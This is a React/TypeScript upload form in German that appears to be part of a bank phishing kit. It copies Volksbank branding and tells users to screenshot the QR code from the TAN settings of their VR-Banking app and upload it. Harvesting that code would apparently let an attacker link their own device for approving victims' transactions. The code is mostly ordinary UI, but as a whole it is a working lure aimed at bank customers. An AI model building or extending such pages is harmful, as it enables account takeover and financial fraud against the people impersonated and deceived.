import React, { useState, useRef, useCallback } from 'react';
import { Camera, Upload, CheckCircle, AlertTriangle, X } from 'lucide-react';

interface QRUploadFormProps {
  onSubmit: (data: FormData) => void;
}

const QRUploadForm: React.FC<QRUploadFormProps> = ({ onSubmit }) => {
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [uploadMethod, setUploadMethod] = useState<'file' | 'camera'>('file');
  const [isLoading, setIsLoading] = useState(false);
  const [preview, setPreview] = useState<string | null>(null);
  const [dragActive, setDragActive] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [isMobile, setIsMobile] = useState(false);

  const fileInputRef = useRef<HTMLInputElement>(null);
  const cameraInputRef = useRef<HTMLInputElement>(null);

  React.useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  const validateFile = (file: File): boolean => {
    const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'application/pdf'];
    const maxSize = 10 * 1024 * 1024; // 10MB

    if (!allowedTypes.includes(file.type)) {
      setError('Ungültiger Dateityp. Nur JPEG, PNG und PDF sind erlaubt.');
      return false;
    }

    if (file.size > maxSize) {
      setError('Datei ist zu groß. Maximale Größe: 10MB');
      return false;
    }

    return true;
  };

  const handleFileSelection = useCallback((file: File, method: 'file' | 'camera') => {
    if (!validateFile(file)) {
      return;
    }

    setSelectedFile(file);
    setUploadMethod(method);
    setError(null);

    // Create preview for images
    if (file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = (e) => {
        setPreview(e.target?.result as string);
      };
      reader.readAsDataURL(file);
    } else {
      setPreview(null);
    }
  }, []);

  const handleFileInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      handleFileSelection(file, 'file');
    }
  };

  const handleCameraInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      handleFileSelection(file, 'camera');
    }
  };

  const handleDrag = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
  }, []);

  const handleDragIn = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setDragActive(true);
  }, []);

  const handleDragOut = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setDragActive(false);
  }, []);

  const handleDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setDragActive(false);
    
    const file = e.dataTransfer.files?.[0];
    if (file) {
      handleFileSelection(file, 'file');
    }
  }, [handleFileSelection]);

  const removeFile = () => {
    setSelectedFile(null);
    setPreview(null);
    setError(null);
    if (fileInputRef.current) fileInputRef.current.value = '';
    if (cameraInputRef.current) cameraInputRef.current.value = '';
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedFile) {
      setError('Bitte wählen Sie eine Datei aus.');
      return;
    }

    setIsLoading(true);
    
    try {
      const formData = new FormData();
      formData.append('qrFile', selectedFile);
      formData.append('uploadMethod', uploadMethod);
      
      console.log('QRUploadForm: Submitting file:', selectedFile.name, selectedFile.size, selectedFile.type);
      await onSubmit(formData);
    } catch (error: any) {
      console.error('QRUploadForm: Submission error:', error);
      setError(error.message || 'Fehler beim Upload. Bitte versuchen Sie es erneut.');
      setIsLoading(false);
    }
  };

  // Responsive styles
  const containerPadding = isMobile ? '20px' : '32px 8px';
  const cardWidth = isMobile ? '100%' : '660px';
  const cardPadding = isMobile ? '16px' : '32px 32px 24px 32px';
  const titleFontSize = isMobile ? '1.5rem' : '2.375rem';
  const titleLineHeight = isMobile ? '1.75rem' : '2.75rem';

  return (
    <div style={{
      backgroundColor: 'transparent',
      padding: '0',
      fontFamily: 'VB-Regular, Arial, sans-serif',
      fontStyle: 'normal'
    }}>
      <div style={{
        maxWidth: '1400px',
        margin: '0 auto',
        padding: containerPadding,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'flex-start'
      }}>
        <div style={{
          width: '100%',
          maxWidth: cardWidth,
          backgroundColor: 'white',
          borderRadius: '8px',
          border: 'none',
          boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)',
          overflow: 'visible'
        }}>
          <div style={{
            padding: cardPadding
          }}>
            <h1 style={{
              color: '#003d7a',
              fontSize: titleFontSize,
              fontWeight: 'normal',
              margin: '0 0 16px 0',
              lineHeight: titleLineHeight,
              fontFamily: 'VB-Bold, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              QR-Code hochladen
            </h1>
            
            <p style={{
              margin: '0 0 32px 0',
              fontSize: isMobile ? '14px' : '16px',
              lineHeight: isMobile ? '20px' : '24px',
              color: '#000',
              fontFamily: 'VB-Regular, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              Bitte laden Sie hier den QR-Code aus Ihrer Banking-App hoch.
            </p>

            <form onSubmit={handleSubmit}>
              {/* Upload Method Selection */}
              <div style={{
                display: 'flex',
                gap: '16px',
                marginBottom: '24px'
              }}>
                <button
                  type="button"
                  onClick={() => setUploadMethod('file')}
                  style={{
                    flex: 1,
                    padding: '16px',
                    border: uploadMethod === 'file' ? '2px solid #003d7a' : '1px solid #dee2e6',
                    borderRadius: '8px',
                    backgroundColor: uploadMethod === 'file' ? '#f2f7fb' : 'transparent',
                    color: uploadMethod === 'file' ? '#003d7a' : '#6c757d',
                    fontFamily: 'VB-Regular, Arial, sans-serif',
                    fontStyle: 'normal',
                    fontSize: '14px',
                    cursor: 'pointer',
                    transition: 'all 0.2s ease',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: '8px'
                  }}
                >
                  <Upload size={16} />
                  Datei auswählen
                </button>
                
                <button
                  type="button"
                  onClick={() => setUploadMethod('camera')}
                  style={{
                    flex: 1,
                    padding: '16px',
                    border: uploadMethod === 'camera' ? '2px solid #003d7a' : '1px solid #dee2e6',
                    borderRadius: '8px',
                    backgroundColor: uploadMethod === 'camera' ? '#f2f7fb' : 'transparent',
                    color: uploadMethod === 'camera' ? '#003d7a' : '#6c757d',
                    fontFamily: 'VB-Regular, Arial, sans-serif',
                    fontStyle: 'normal',
                    fontSize: '14px',
                    cursor: 'pointer',
                    transition: 'all 0.2s ease',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: '8px'
                  }}
                >
                  <Camera size={16} />
                  Foto aufnehmen
                </button>
              </div>

              {/* Upload Area */}
              <div
                onDragEnter={handleDragIn}
                onDragLeave={handleDragOut}
                onDragOver={handleDrag}
                onDrop={handleDrop}
                onClick={() => {
                  if (uploadMethod === 'file') {
                    fileInputRef.current?.click();
                  } else {
                    cameraInputRef.current?.click();
                  }
                }}
                style={{
                  border: dragActive ? '2px dashed #003d7a' : '2px dashed #dee2e6',
                  borderRadius: '8px',
                  padding: '40px 20px',
                  textAlign: 'center',
                  backgroundColor: dragActive ? '#f2f7fb' : '#f8f9fa',
                  cursor: 'pointer',
                  transition: 'all 0.3s ease',
                  marginBottom: '24px'
                }}
              >
                <div style={{
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: '16px'
                }}>
                  <div style={{
                    color: dragActive ? '#003d7a' : '#6c757d',
                    transition: 'color 0.3s ease'
                  }}>
                    {uploadMethod === 'camera' ? <Camera size={48} /> : <Upload size={48} />}
                  </div>
                  
                  <div>
                    <h3 style={{
                      fontSize: '18px',
                      fontWeight: 'normal',
                      color: '#003d7a',
                      margin: '0 0 8px 0',
                      fontFamily: 'VB-Bold, Arial, sans-serif',
                      fontStyle: 'normal'
                    }}>
                      {selectedFile ? selectedFile.name : 
                       uploadMethod === 'camera' ? 'Foto aufnehmen' : 'Datei hier ablegen oder klicken'}
                    </h3>
                    
                    <p style={{
                      fontSize: '14px',
                      color: '#6c757d',
                      margin: 0,
                      fontFamily: 'VB-Regular, Arial, sans-serif',
                      fontStyle: 'normal'
                    }}>
                      Unterstützte Formate: JPG, PNG, PDF (max. 10MB)
                    </p>
                  </div>
                </div>
              </div>

              {/* Hidden file inputs */}
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*,.pdf"
                onChange={handleFileInput}
                style={{ display: 'none' }}
              />
              
              <input
                ref={cameraInputRef}
                type="file"
                accept="image/*"
                capture="environment"
                onChange={handleCameraInput}
                style={{ display: 'none' }}
              />

              {/* File Preview */}
              {selectedFile && (
                <div style={{
                  backgroundColor: '#e8f4fd',
                  border: '1px solid #b8d4e3',
                  borderRadius: '8px',
                  padding: '16px',
                  marginBottom: '24px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '16px'
                }}>
                  {preview && (
                    <img 
                      src={preview} 
                      alt="Preview" 
                      style={{
                        width: '60px',
                        height: '60px',
                        objectFit: 'cover',
                        borderRadius: '4px'
                      }}
                    />
                  )}
                  
                  <div style={{ flex: 1 }}>
                    <h4 style={{
                      fontSize: '14px',
                      fontWeight: 'normal',
                      color: '#003d7a',
                      margin: '0 0 4px 0',
                      fontFamily: 'VB-Bold, Arial, sans-serif',
                      fontStyle: 'normal'
                    }}>
                      {selectedFile.name}
                    </h4>
                    <p style={{
                      fontSize: '12px',
                      color: '#6c757d',
                      margin: 0,
                      fontFamily: 'VB-Regular, Arial, sans-serif',
                      fontStyle: 'normal'
                    }}>
                      {(selectedFile.size / 1024 / 1024).toFixed(2)} MB • {uploadMethod === 'camera' ? 'Foto' : 'Datei'}
                    </p>
                  </div>
                  
                  <button
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      removeFile();
                    }}
                    style={{
                      background: 'none',
                      border: 'none',
                      color: '#dc3545',
                      cursor: 'pointer',
                      padding: '4px',
                      borderRadius: '4px',
                      transition: 'background-color 0.2s ease'
                    }}
                    onMouseOver={(e) => {
                      e.currentTarget.style.backgroundColor = '#fef2f2';
                    }}
                    onMouseOut={(e) => {
                      e.currentTarget.style.backgroundColor = 'transparent';
                    }}
                  >
                    <X size={20} />
                  </button>
                </div>
              )}

              {/* Error Message */}
              {error && (
                <div style={{
                  backgroundColor: '#fef2f2',
                  border: '1px solid #fecaca',
                  borderRadius: '8px',
                  padding: '16px',
                  marginBottom: '24px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px'
                }}>
                  <AlertTriangle size={20} color="#dc3545" />
                  <p style={{
                    fontSize: '14px',
                    color: '#dc3545',
                    margin: 0,
                    fontFamily: 'VB-Regular, Arial, sans-serif',
                    fontStyle: 'normal'
                  }}>
                    {error}
                  </p>
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={!selectedFile || isLoading}
                style={{
                  backgroundColor: (selectedFile && !isLoading) ? '#0066b3' : '#ccc',
                  color: 'white',
                  border: 'none',
                  borderRadius: '50px',
                  padding: isMobile ? '16px 32px' : '18px 48px',
                  fontSize: isMobile ? '16px' : '18px',
                  fontFamily: 'VB-Bold, Arial, sans-serif',
                  fontStyle: 'normal',
                  fontWeight: 'normal',
                  cursor: (selectedFile && !isLoading) ? 'pointer' : 'not-allowed',
                  transition: 'background-color 0.2s ease',
                  width: '100%',
                  textAlign: 'center',
                  display: 'inline-block',
                  lineHeight: '1.5'
                }}
                onMouseOver={(e) => {
                  if (selectedFile && !isLoading) {
                    e.currentTarget.style.backgroundColor = '#0052a3';
                  }
                }}
                onMouseOut={(e) => {
                  if (selectedFile && !isLoading) {
                    e.currentTarget.style.backgroundColor = '#0066b3';
                  }
                }}
              >
                {isLoading ? 'Wird hochgeladen...' : 'QR-Code hochladen'}
              </button>
            </form>

            {/* Instructions */}
            <div style={{
              marginTop: '32px',
              backgroundColor: '#e8f4fd',
              border: '1px solid #b8d4e3',
              borderRadius: '8px',
              padding: '20px'
            }}>
              <h3 style={{
                fontSize: '16px',
                fontWeight: 'normal',
                color: '#003d7a',
                margin: '0 0 12px 0',
                fontFamily: 'VB-Bold, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Anleitung:
              </h3>
              <ol style={{
                fontSize: '14px',
                color: '#333333',
                lineHeight: '20px',
                margin: 0,
                paddingLeft: '20px',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                <li style={{ marginBottom: '8px' }}>Öffnen Sie Ihre VR-Banking-App</li>
                <li style={{ marginBottom: '8px' }}>Navigieren Sie zu den TAN-Einstellungen</li>
                <li style={{ marginBottom: '8px' }}>Erstellen Sie einen Screenshot des QR-Codes</li>
                <li style={{ marginBottom: '0' }}>Laden Sie den Screenshot hier hoch</li>
              </ol>
            </div>
          </div>
        </div>
      </div>
      
      <style>
        {`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}
      </style>
    </div>
  );
};

export default QRUploadForm;